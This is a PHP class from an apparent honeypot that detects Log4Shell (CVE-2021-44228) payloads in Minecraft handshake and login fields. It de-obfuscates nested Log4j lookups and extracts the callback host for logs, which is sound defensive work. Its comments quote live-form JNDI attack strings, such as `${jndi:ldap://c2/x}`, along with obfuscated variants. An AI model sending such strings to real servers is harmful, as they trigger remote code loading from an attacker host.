<?php

declare(strict_types=1);

namespace Funnypot\Protocol\Minecraft;

/**
 * Pure Log4Shell (CVE-2021-44228) classifier for Minecraft handshake/login strings (FP-0206). No I/O.
 *
 * Attackers spray `${jndi:ldap://c2/x}` into the handshake server-address and the login username. Log4j
 * also resolves nested lookups, so the payload is routinely obfuscated: `${${lower:j}ndi:…}`,
 * `${jndi:${lower:l}dap://…}`, `${env:X:-ldap}`, `${::-j}`. This normalizes those wrappers first, then
 * matches the JNDI structure + callback scheme.
 *
 * INERT: it only DECODES and classifies. It never resolves, connects to, or looks up the callback — that
 * outbound JNDI/LDAP/RMI fetch is the vulnerability itself. The extracted C2 is intel for the log only.
 *
 * Clean-room: keys on the `${jndi:` / wrapper structure + URI schemes (durable CVE facts), never a
 * scanner/matcher signature string.
 */
final class MinecraftThreat
{
    public const CLASS_LOG4SHELL = 'minecraft_log4shell';
    public const CLASS_PING = 'minecraft_ping';

    private const MAX_NORMALIZE_PASSES = 12; // bound the de-obfuscation so a nested payload can't spin

    /**
     * Classify one or more untrusted strings (server address, username).
     *
     * @param array<string> $fields
     * @return array{class:string, critical:bool, raw:?string, c2:?string}
     */
    public static function classify(array $fields): array
    {
        foreach ($fields as $raw) {
            if ($raw === '') {
                continue;
            }
            // GATE: a raw `${jndi:` or a Log4j wrapper nesting around it fires regardless of extraction.
            $normalized = self::normalize($raw);
            $hit = \stripos($raw, '${jndi:') !== false
                || \stripos($normalized, 'jndi:') !== false;
            if (!$hit) {
                continue;
            }

            return [
                'class' => self::CLASS_LOG4SHELL,
                'critical' => true,
                'raw' => $raw,                       // always log the raw payload
                'c2' => self::extractC2($normalized), // best-effort intel, may be null
            ];
        }

        return ['class' => self::CLASS_PING, 'critical' => false, 'raw' => null, 'c2' => null];
    }

    /**
     * Collapse the Log4j lookup wrappers to reveal an obfuscated `jndi:`/scheme. Bounded passes; each pass
     * resolves the innermost `${lower:X}` / `${upper:X}` / `${env:NAME:-X}` / `${::-X}` / `${lower:...}` to X.
     */
    private static function normalize(string $s): string
    {
        for ($pass = 0; $pass < self::MAX_NORMALIZE_PASSES; $pass++) {
            $before = $s;
            // ${lower:X} / ${upper:X} -> X (case transforms)
            $s = \preg_replace_callback('/\$\{(?:lower|upper):([^${}]*)\}/i', static fn ($m) => $m[1], $s) ?? $s;
            // ${env:NAME:-X} / ${sys:NAME:-X} / ${::-X} / ${date:-X} -> X (default-value lookups)
            $s = \preg_replace_callback('/\$\{[^${}:]*:-([^${}]*)\}/', static fn ($m) => $m[1], $s) ?? $s;
            // ${env:NAME} / ${sys:NAME} with no default -> drop the wrapper, keep nothing meaningful
            $s = \preg_replace('/\$\{(?:env|sys|main|java):[^${}]*\}/i', '', $s) ?? $s;
            if ($s === $before) {
                break; // fixed point
            }
        }

        return $s;
    }

    /** Best-effort callback extraction from the normalized payload. Null if it can't be read. */
    private static function extractC2(string $normalized): ?string
    {
        if (\preg_match('#\b(ldap|ldaps|rmi|dns|corba|nis|iiop|nds|http)://[^\s"${}\\\\]+#i', $normalized, $m) === 1) {
            return $m[0];
        }

        return null;
    }
}
